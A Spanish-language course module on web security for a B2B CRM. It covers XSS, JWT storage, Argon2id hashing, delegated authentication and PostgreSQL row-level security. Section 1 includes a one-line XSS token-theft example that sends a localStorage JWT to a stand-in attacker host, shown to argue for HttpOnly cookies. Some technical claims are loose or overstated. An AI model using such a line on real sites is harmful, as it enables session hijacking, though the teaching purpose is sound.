

# Módulo 8: Seguridad Integral (Zero-Trust & Auth)

En la época dorada de MySpace o foros PHP iniciales, la ciberseguridad era una barrera reactiva ("Me hackearon, ponle un IF y una contraseña"). Hoy, en sistemas B2B como **Templados AL13**, una fuga de la tabla general del *CRM* puede arruinar una marca para siempre.

Por ello, la seguridad ya no es periférica, es **Defensa en Profundidad** (Arquitectura basada en Zero-Trust).

## 1. Vulnerabilidades Históricas: XSS y el Suicidio del `localStorage`

El ataque de Cross-Site Scripting (XSS) ocurre cuando un atacante logra inyectar JavaScript no autorizado dentro de tu página web (Por ejemplo, publicando un `<script>` oculto dentro de un campo de comentario o a través de la red publicitaria perimétrica). 

**El Gran Pecado de React/SPA (2015-2022):** 
Por comodidad, los tutoriales de internet enseñaban a guardar los "Tokens JWT de Administrador" en el `localStorage` del navegador. Si tu página sufría un ataque XSS, al hacker le costaba 1 línea de código robar tu identidad maestra: `fetch("hacker.com?token=" + window.localStorage.getItem('jwt'))`. 

*   *El Mandato B2B Actual:* Los tokens de sesión volátiles deben viajar **Ocultos**. Sólo deben guardarse en **Cookies `HttpOnly`**. Javascript no puede leer las cookies `HttpOnly` del sistema ni aunque lo intente el hacker más brillante.

## 2. El Péndulo Criptográfico y Contraseñas (Argon2id)

Guardar contraseñas en texto plano (`password123`) en la Base de Datos es un crimen informático. Durante años usamos algoritmos de Hash rápido como MD5 o SHA-1. 
*   **El Problema:** El hardware de tarjetas gráficas (GPUs) de los mineros de Bitcoin avanzó tanto, que hoy pueden crackear miles de millones de hashes SHA-1 por segundo mediante fuerza bruta masiva paralela.
*   **La Solución Criptográfica (Argon2id):** Es el estándar de oro en encriptado de estado de reposo para 2026. A diferencia de MD5, Argon2id exige al atacante una cantidad masiva de *Memoria RAM*, desactivando la ventaja del hardware hiper-veloz de GPU de minería asics.

## 3. Delegación de la Responsabilidad: Identity Providers (GoTrue/Supabase)

La mejor manera de protegerte de un ataque Auth a tu base de datos, es *¡No desarrollar sistemas de Auth artesanales a mano!*
*   **Enfoque FAANG:** Google delega su Auth a Firebase Auth/Identity. 
*   **Enfoque AL13:** Usamos la arquitectura GoTrue subyacente de Supabase. Delegamos el "Rate Limiting", el reseteo transaccional de contraseña y la firma EdDSA del `Header` JWT a componentes OpenSource probados militarmente. Se prohibe al ingeniero Junior hacer comandos manuales como `bcrypt.compare()` a mano.

## 4. RLS - Row Level Security (Seguridad en el Sótano Mismo)

A pesar de las capas Edge Frontend, debes asumir que el *atacante ya está dentro del sistema*.
En AWS o PostgreSQL, usas el modelo **Row-Level-Security (RLS)**. No importa si tu código de Backend se vuelve vulnerable a un RCE (Remote Code Execution) e intenta robarse todo: 
`SELECT * FROM admin_financial_data;`
La base de datos, a nivel duro de kernel (sótano), lee el ID de rol de quien pregunta las cosas directamente y aborta con 0 filas (`0 rows affected`) cortando la exfiltración masiva.

> **Lección de Lead Architect:** La mentalidad Zero-Trust manda: *"No confíes en tu frontend. No confíes en tu Red. No confíes en la máquina de tu empleado. El acceso se comprueba de nuevo en cada capa inferior del castillo".*
